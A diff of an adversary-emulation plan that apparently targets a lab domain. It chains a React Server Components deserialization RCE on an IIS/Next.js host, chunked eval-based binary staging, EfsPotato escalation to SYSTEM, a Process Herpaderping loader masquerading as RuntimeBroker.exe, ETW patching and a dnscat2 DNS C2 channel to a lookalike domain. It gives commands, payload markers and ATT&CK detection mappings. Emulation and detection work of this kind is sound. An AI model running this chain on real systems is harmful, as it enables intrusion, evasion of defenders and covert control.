@@ -24,7 +24,7 @@ The attacker directly exploits a React Server Components deserialization vulnera
 
 The attacker exploits `react.testlab.local` — a Next.js application running on the same IIS server under `iisnode`. A crafted React Server Components multipart request reaches the vulnerable deserialization path and executes JavaScript inside the Node.js worker as `IIS APPPOOL\react.testlab.local`.
 
-With a live web RCE shell established, the react2shell staging channel is used to upload and decode three binaries: `CertEnrollAgent.exe` (the CWLHerpaderping loader), `CertEnrollSvc.exe` (the EfsPotato SYSTEM escalation tool), and the dnscat2 payload as `CertCA.bin`. Uploads are performed in 2,000-character base64 chunks via `fs.writeFileSync`/`fs.appendFileSync` eval calls; decoding uses the Node.js `Buffer` API — no child process is spawned at any point during staging.
+With a live web RCE shell established, the react2shell staging channel is used to stage three binaries directly to `.bin` files: `CertEnrollAgent.bin` (the CWLHerpaderping loader), `CertEnrollSvc.bin` (the EfsPotato SYSTEM escalation tool), and `CertCA.bin` (the dnscat2 payload). For each payload, the `stage` command reads the raw PE from the attacker's local disk, base64-encodes it in Python memory, streams the encoded bytes in 2,000-character chunks into `global.__stageBuffer` on the target Node.js process via eval, then flushes the decoded binary directly to the destination `.bin` path in a single `Buffer.from(__stageBuffer,'base64')` write call — no `.b64` file is written to the target disk at any point during staging.
 
 With `CertEnrollSvc.exe` staged, the attacker fires it via `eval` + detached `spawn` from the still-live Node.js shell. CertEnrollSvc coerces a privileged local named-pipe connection and impersonates the `NT AUTHORITY\SYSTEM` token, then uses `CreateProcessAsUser` to launch `CertEnrollAgent.exe` in a hidden window as SYSTEM. CertEnrollAgent reads `CertCA.bin` from disk, deletes it immediately to remove the file artifact (T1070.004), and performs the Herpaderping loader flow: the dnscat2 PE is written into a temporary section-backed image (`HD*.tmp`), a ghost process is created with the image path `C:\Windows\System32\RuntimeBroker.exe`, the temporary file is overwritten to break post-creation scanning, and the ghost process PEB is rewritten to spoof both the image path and command-line arguments. A second C2 session is established from the IIS host as `NT AUTHORITY\SYSTEM`. The attacker issues a `shell` command to spawn `cmd.exe` under the ghost process; all subsequent commands in Phases 2–5 execute within this child shell.
 
@@ -37,26 +37,6 @@ With `CertEnrollSvc.exe` staged, the attacker fires it via `eval` + detached `sp
 > covers the DNS C2 client.
 
 ### Setup
-
-- ☣️ Encode `CertEnrollSvc.exe`, `dnscat2.exe`, and `CWLHerpaderping.exe` to base64 on the attacker machine
-
-  ```bash
-  cd resources/payloads/react2shell-tool
-  python encode_payload.py ../EfsPotato/CertEnrollSvc.exe -o CertEnrollSvc.b64 -l 0
-  python encode_payload.py ../dnscat2.exe -o dnscat2.b64 -l 0
-  python encode_payload.py ../CWLHerpaderping/x64/Release/CWLHerpaderping.exe -o CertEnrollAgent.b64 -l 0
-  ```
-
-  - ***Expected Output***
-
-    ```text
-    [+] Encoding successful!
-    [*] Lines: 1 x 0 chars
-    [+] Encoding successful!
-    [*] Lines: 1 x 0 chars
-    [+] Encoding successful!
-    [*] Lines: 1 x 0 chars
-    ```
 
 - ☣️ Launch the interactive exploitation shell against the target
 
@@ -75,50 +55,47 @@ With `CertEnrollSvc.exe` staged, the attacker fires it via `eval` + detached `sp
 
 ### Procedures
 
-- ☣️ Upload and decode `CertEnrollAgent.exe` (Herpaderping loader)
+- ☣️ Stage `CertEnrollAgent.exe` (Herpaderping loader) — encode + stream + decode in one step, no `.b64` disk artifact; then rename to `.exe`
 
   ```
-  upload CertEnrollAgent.b64 C:\Windows\Temp\CertEnrollAgent.b64
-  decode C:\Windows\Temp\CertEnrollAgent.b64 C:\ProgramData\CertEnrollAgent.bin
+  stage ../CWLHerpaderping/x64/Release/CWLHerpaderping.exe C:\ProgramData\CertEnrollAgent.bin
   rename C:\ProgramData\CertEnrollAgent.bin C:\ProgramData\CertEnrollAgent.exe
   ```
 
   - ***Expected Output***
 
     ```text
-    [+] File uploaded successfully -> C:\Windows\Temp\CertEnrollAgent.b64
-    [+] File decoded successfully -> C:\ProgramData\CertEnrollAgent.bin
-    [+] File renamed: C:\ProgramData\CertEnrollAgent.bin -> C:\ProgramData\CertEnrollAgent.exe
+    [*] Staging .../CWLHerpaderping.exe (...) -> C:\ProgramData\CertEnrollAgent.bin in N chunks (NO .b64 disk artifact)...
+    [+] File staged successfully -> C:\ProgramData\CertEnrollAgent.bin (... bytes, NO .b64 disk artifact!)
+    [+] File renamed successfully -> C:\ProgramData\CertEnrollAgent.exe
     ```
 
-- ☣️ Upload and decode `CertEnrollSvc.exe` (EfsPotato escalation tool)
+- ☣️ Stage `CertEnrollSvc.exe` (EfsPotato escalation tool) — encode + stream + decode in one step, no `.b64` disk artifact; then rename to `.exe`
 
   ```
-  upload CertEnrollSvc.b64 C:\Windows\Temp\CertEnrollSvc.b64
-  decode C:\Windows\Temp\CertEnrollSvc.b64 C:\Windows\Temp\CertEnrollSvc.bin
+  stage ../EfsPotato/CertEnrollSvc.exe C:\Windows\Temp\CertEnrollSvc.bin
   rename C:\Windows\Temp\CertEnrollSvc.bin C:\Windows\Temp\CertEnrollSvc.exe
   ```
 
   - ***Expected Output***
 
     ```text
-    [+] File uploaded successfully -> C:\Windows\Temp\CertEnrollSvc.b64
-    [+] File decoded successfully -> C:\Windows\Temp\CertEnrollSvc.bin
-    [+] File renamed: C:\Windows\Temp\CertEnrollSvc.bin -> C:\Windows\Temp\CertEnrollSvc.exe
+    [*] Staging .../CertEnrollSvc.exe (...) -> C:\Windows\Temp\CertEnrollSvc.bin in N chunks (NO .b64 disk artifact)...
+    [+] File staged successfully -> C:\Windows\Temp\CertEnrollSvc.bin (... bytes, NO .b64 disk artifact!)
+    [+] File renamed successfully -> C:\Windows\Temp\CertEnrollSvc.exe
     ```
 
-- ☣️ Upload and decode dnscat2 payload to disk (file-based staging)
+- ☣️ Stage dnscat2 payload to disk (file-based staging) — encode + stream + decode in one step, no `.b64` disk artifact
 
   ```
-  upload dnscat2.b64 C:\Windows\Temp\dnscat2-disk.b64
-  decode C:\Windows\Temp\dnscat2-disk.b64 C:\ProgramData\CertCA.bin
+  stage ../dnscat2/go-client/dnscat2.exe C:\ProgramData\CertCA.bin
   ```
 
   - ***Expected Output***
 
     ```text
-    [+] File uploaded successfully -> C:\Windows\Temp\dnscat2-disk.b64
-    [+] File decoded successfully -> C:\ProgramData\CertCA.bin
+    [*] Staging .../dnscat2.exe (...) -> C:\ProgramData\CertCA.bin in N chunks (NO .b64 disk artifact)...
+    [+] File staged successfully -> C:\ProgramData\CertCA.bin (... bytes, NO .b64 disk artifact!)
     ```
 
 - ☣️ Launch `CertEnrollSvc.exe` (EfsPotato) via eval detached spawn — exploits `SeImpersonatePrivilege` to run `CertEnrollAgent.exe` as `NT AUTHORITY\SYSTEM`; CertEnrollAgent reads `CertCA.bin` from disk and deletes it (T1070.004)
@@ -173,8 +150,8 @@ With `CertEnrollSvc.exe` staged, the attacker fires it via `eval` + detached `sp
 | Initial Access | T1190 | Exploit Public-Facing Application | Windows | HTTP POST to React RSC endpoint with `Next-Action: x` header and multipart body containing `"then":"$1:__proto__:then"` field; server responds with `X-Action-Redirect: /login?a=<base64>` header carrying command output | Not Calibrated - Not Benign | Attacker sends crafted RSC flight data to `react.testlab.local` exploiting CVE-2025-55182 deserialization to inject JavaScript into `_prefix` field | react.testlab.local | IIS APPPOOL\react.testlab.local | [payload_generator.py](../../resources/payloads/react2shell-tool/exploit_tool/payload_generator.py) | - |
 | Execution | T1059.007 | Command and Scripting Interpreter: JavaScript | Windows | `iisnode` evaluates attacker-controlled JavaScript embedded in the `_prefix` response field; no child process created; execution occurs within the existing Node.js worker process | Not Calibrated - Not Benign | Exploit injects `eval(String.fromCharCode(...))` as the `_prefix` value, executing arbitrary Node.js code in the IIS worker process | react.testlab.local | IIS APPPOOL\react.testlab.local | [payload_generator.py build_exploit_payload()](../../resources/payloads/react2shell-tool/exploit_tool/payload_generator.py) | - |
 | Defense Evasion | T1027.010 | Obfuscated Files or Information: Command Obfuscation | Windows | JavaScript payload delivered as `eval(String.fromCharCode(<decimal-list>))` with no readable string literals; source code is not present in server logs or request bodies | Not Calibrated - Not Benign | All `fs` API calls and path strings are encoded as charcode arrays to evade string-based log detection | react.testlab.local | IIS APPPOOL\react.testlab.local | [file_ops.py to_charcode()](../../resources/payloads/react2shell-tool/exploit_tool/commands/file_ops.py) | - |
-| Command and Control | T1105 | Ingress Tool Transfer | Windows | `node.exe` writes and appends to `C:\Windows\Temp\CertEnrollAgent.b64`, `C:\Windows\Temp\CertEnrollSvc.b64`, and `C:\Windows\Temp\dnscat2-disk.b64` on IIS01 | Calibrated - Not Benign | `upload` command transfers CertEnrollAgent.exe, CertEnrollSvc.exe, and dnscat2 payload encoded as base64 in chunks via eval-based `fs` writes — no child process spawned | react.testlab.local | IIS APPPOOL\react.testlab.local | [file_ops.py upload()](../../resources/payloads/react2shell-tool/exploit_tool/commands/file_ops.py) | - |
-| Defense Evasion | T1140 | Deobfuscate/Decode Files or Information | Windows | `node.exe` reads each `.b64` file and writes decoded bytes to a `.bin` staging file, then renames to `.exe`; separately decodes `dnscat2-disk.b64` to `C:\ProgramData\CertCA.bin`; all file operations on IIS01 | Calibrated - Not Benign | `decode` decodes base64 files to PE bytes using Node.js `Buffer` API via eval; `rename` promotes `.bin` to `.exe` — no spawn at any staging step | react.testlab.local | IIS APPPOOL\react.testlab.local | [file_ops.py decode()](../../resources/payloads/react2shell-tool/exploit_tool/commands/file_ops.py), [file_ops.py rename()](../../resources/payloads/react2shell-tool/exploit_tool/commands/file_ops.py) | - |
+| Command and Control | T1105 | Ingress Tool Transfer | Windows | `node.exe` accumulates base64 chunks in `global.__stageBuffer` (in-process memory) and writes `CertEnrollAgent.bin`, `CertEnrollSvc.bin`, and `CertCA.bin` directly to disk on IIS01 — no intermediate `.b64` files written to target; observable as `node.exe` writing PE-format `.bin` files | Calibrated - Not Benign | `stage` command reads raw PE binary locally, base64-encodes in Python memory, streams 2000-char chunks into `global.__stageBuffer` on target via eval, then flushes decoded bytes to `.bin` destination in one `Buffer.from(__stageBuffer,'base64')` write — no child process spawned, no `.b64` on disk | react.testlab.local | IIS APPPOOL\react.testlab.local | [file_ops.py stage()](../../resources/payloads/react2shell-tool/exploit_tool/commands/file_ops.py) | - |
+| Defense Evasion | T1140 | Deobfuscate/Decode Files or Information | Windows | `node.exe` decodes base64 from in-process `global.__stageBuffer` and writes PE bytes to a `.bin` staging file on IIS01; `node.exe` then renames each `.bin` to `.exe` — no intermediate `.b64` file on disk at any point | Calibrated - Not Benign | `stage` command decodes base64 from in-memory global buffer to PE bytes using Node.js `Buffer` API via eval; `rename` promotes `.bin` to `.exe` — no `.b64` disk artifact, no upload step | react.testlab.local | IIS APPPOOL\react.testlab.local | [file_ops.py stage()](../../resources/payloads/react2shell-tool/exploit_tool/commands/file_ops.py), [file_ops.py rename()](../../resources/payloads/react2shell-tool/exploit_tool/commands/file_ops.py) | - |
 | Privilege Escalation | T1134.001 | Access Token Manipulation: Token Impersonation/Theft | Windows | Sysmon Event 1 on IIS01: `CertEnrollAgent.exe` spawned by `CertEnrollSvc.exe` (IIS APPPOOL\react.testlab.local); `CertEnrollAgent.exe` process token context shows `NT AUTHORITY\SYSTEM` — AppPool identity producing a SYSTEM-privileged child is the primary observable of the EfsPotato named-pipe token impersonation chain | Calibrated - Not Benign | Step 1A: CertEnrollSvc uses `SeImpersonatePrivilege` to obtain SYSTEM token via named-pipe impersonation; implementation details in [efspotato.md](../further-reading/efspotato.md) | react.testlab.local | NT AUTHORITY\SYSTEM | [CertEnrollSvc.cs](../../resources/payloads/EfsPotato/CertEnrollSvc.cs) | - |
 | Privilege Escalation | T1134.002 | Access Token Manipulation: Create Process with Token | Windows | `CertEnrollSvc.exe` calls `CreateProcessAsUser` with the impersonated token; child process (`CertEnrollAgent.exe`) is created with `CREATE_NO_WINDOW` (`0x08000000`) | Not Calibrated - Not Benign | Step 1A: CertEnrollSvc spawns CertEnrollAgent as SYSTEM using the impersonated token; implementation details in [efspotato.md](../further-reading/efspotato.md) | react.testlab.local | NT AUTHORITY\SYSTEM | [CertEnrollSvc.cs](../../resources/payloads/EfsPotato/CertEnrollSvc.cs) | - |
 | Defense Evasion | T1562.006 | Impair Defenses: Indicator Blocking | Windows | **Opt-in (build with `-DENABLE_ETW_PATCH`)**: `CertEnrollAgent.exe` patches `ntdll!EtwEventWrite` in its own process memory to `xor eax,eax; ret` after changing the code page protection, causing subsequent ETW writes from the loader process to return fake success; not present in default build | Not Calibrated - Not Benign | CWLHerpaderping tampers with ETW before entering the sensitive loader flow; only active when compiled with `ENABLE_ETW_PATCH` preprocessor flag — see [build.md](../../resources/payloads/CWLHerpaderping/build.md) | react.testlab.local | NT AUTHORITY\SYSTEM | [CWLImplant.cpp PatchEtw()](../../resources/payloads/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp) | - |
@@ -183,7 +160,7 @@ With `CertEnrollSvc.exe` staged, the attacker fires it via `eval` + detached `sp
 | Defense Evasion | T1134.004 | Access Token Manipulation: Parent PID Spoofing | Windows | `CertEnrollAgent.exe` spawns `RuntimeBroker.exe` ghost process with PPID spoofed to `svchost.exe` or `wininit.exe` (Session 0) on IIS01 | Calibrated - Not Benign | Step 1A: CertEnrollAgent chooses Session 0 parent for ghost process; implementation details in [process-herpaderping.md](../further-reading/process-herpaderping.md) | react.testlab.local | NT AUTHORITY\SYSTEM | [CWLImplant.cpp GetNonJobParent()](../../resources/payloads/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp) | - |
 | Defense Evasion | T1070.004 | Indicator Removal: File Deletion | Windows | `CertEnrollAgent.exe` deletes `C:\ProgramData\CertCA.bin` from disk after loading the PE | Calibrated - Not Benign | Step 1A: CWLHerpaderping deletes the dnscat2 payload file after loading to remove forensic evidence; file deletion occurs in fallback mode when stdin is not redirected | react.testlab.local | NT AUTHORITY\SYSTEM | [CWLImplant.cpp GetPayloadBuffer()](../../resources/payloads/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp) | - |
 | Defense Evasion | T1036.005 | Masquerading: Match Legitimate Resource Name or Location | Windows | ghost process reports `ImageFileName = C:\Windows\System32\RuntimeBroker.exe`; EDR image verification: PE mapped in the ghost process address space does not match the on-disk hash of `C:\Windows\System32\RuntimeBroker.exe` — image path vs. mapped content mismatch is the Herpaderping masquerade artifact | Calibrated - Not Benign | Step 1A: CWLHerpaderping makes ghost process resemble legitimate Windows component by assigning trusted image path; masquerading outcome mapped separately from PEB rewrite under process argument spoofing | react.testlab.local | NT AUTHORITY\SYSTEM | [CWLImplant.cpp Herpaderping()](../../resources/payloads/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp) | - |
-| Command and Control | T1071.004 | Application Layer Protocol: DNS | Windows | `RuntimeBroker.exe` (dnscat2 ghost process) issues a high volume of DNS queries containing encoded subdomain labels to `attacker.local` | Calibrated - Not Benign | Step 1A: dnscat2 C2 session established as SYSTEM via Herpaderping ghost process; bootstrapped from react2shell session via eval detached spawn of CertEnrollSvc | react.testlab.local | NT AUTHORITY\SYSTEM | [dnscat2.exe](../../resources/payloads/dnscat2.exe) | - |
+| Command and Control | T1071.004 | Application Layer Protocol: DNS | Windows | `RuntimeBroker.exe` (dnscat2 ghost process) issues a high volume of DNS queries containing encoded subdomain labels to `crl.ms-cert.net` | Calibrated - Not Benign | Step 1A: dnscat2 C2 session established as SYSTEM via Herpaderping ghost process; bootstrapped from react2shell session via eval detached spawn of CertEnrollSvc | react.testlab.local | NT AUTHORITY\SYSTEM | [dnscat2.exe](../../resources/payloads/dnscat2.exe) | - |
 | Command and Control | T1573.002 | Encrypted Channel: Asymmetric Cryptography | Windows | DNS query payloads are encrypted after dnscat2 session key negotiation | Not Calibrated - Not Benign | dnscat2 encrypts C2 session data; protocol details are covered in [dnscat2.md](../further-reading/dnscat2.md) | react.testlab.local | NT AUTHORITY\SYSTEM | [dnscat2.exe](../../resources/payloads/dnscat2.exe) | - |
 | Discovery | T1012 | Query Registry | Windows | EDR registry access event on IIS01: `RuntimeBroker.exe` (dnscat2 ghost process, NT AUTHORITY\SYSTEM) reads `HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{GUID}\NameServer`; `RuntimeBroker.exe` (UWP process broker) reading TCP/IP DNS resolver configuration keys is anomalous | Calibrated - Not Benign | Step 1A: dnscat2 enumerates TCP/IP interface GUIDs, reads NameServer/DhcpNameServer registry values to discover DNS resolver for C2 tunneling | react.testlab.local | NT AUTHORITY\SYSTEM | [getdns_windows.go getSystemDNS()](../../resources/payloads/dnscat2/go-client/cmd/dnscat/getdns_windows.go) | - |
 | Defense Evasion | T1564.003 | Hide Artifacts: Hidden Window | Windows | `CertEnrollSvc.exe` spawns `CertEnrollAgent.exe` with `CREATE_NO_WINDOW` (`0x08000000`); dnscat2 executes without a console window | Not Calibrated - Not Benign | Step 1A: Escalation and C2 launch run without visible console windows; implementation details in [efspotato.md](../further-reading/efspotato.md) and [dnscat2.md](../further-reading/dnscat2.md) | react.testlab.local | NT AUTHORITY\SYSTEM | [CertEnrollSvc.cs](../../resources/payloads/EfsPotato/CertEnrollSvc.cs), [dnscat2 build flags](../../resources/payloads/dnscat2/go-client) | - |
